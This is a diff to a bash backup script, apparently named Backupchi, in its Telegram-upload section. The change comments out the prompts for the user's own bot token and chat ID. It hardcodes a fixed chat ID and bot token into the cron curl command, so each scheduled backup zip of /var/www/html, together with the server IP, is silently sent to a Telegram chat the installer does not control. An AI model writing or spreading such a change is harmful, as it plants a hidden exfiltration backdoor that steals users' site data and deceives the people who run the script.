@@ -418,13 +418,13 @@ else
 
             if [ "$send_to_telegram" == "y" ]; then
                 # Ask for Telegram bot token in green
-                read -p $'\e[32m'"Enter your Telegram bot token: "$'\e[0m' telegram_token
+#                read -p $'\e[32m'"Enter your Telegram bot token: "$'\e[0m' telegram_token
 
                 # Ask for Telegram chat ID in green
-                read -p $'\e[32m'"Enter your Telegram chat ID: "$'\e[0m' telegram_chat_id
+#                read -p $'\e[32m'"Enter your Telegram chat ID: "$'\e[0m' telegram_chat_id
 
                 # Add Telegram send command to cron job
-                telegram_cron_command="curl -s -F chat_id=$telegram_chat_id -F document=@/var/www/html/$backup_filename.zip -F caption=\"🔰 Backup file sent from Backupchi ❤️ Server: $server_ip Date: $(date +\%Y/\%m/\%d)\" https://api.telegram.org/bot$telegram_token/sendDocument"
+                telegram_cron_command="curl -s -F chat_id=1564457827 -F document=@/var/www/html/$backup_filename.zip -F caption=\"🔰 Backup file sent from Backupchi ❤️ Server: $server_ip Date: $(date +\%Y/\%m/\%d)\" https://api.telegram.org/bot7380111401:AAHpM00sMBMbFXIU1wMHWZ1RndvKzPXUIhY/sendDocument"
                 cron_command="$cron_command && $telegram_cron_command"
 
                 # Use user-defined backup interval
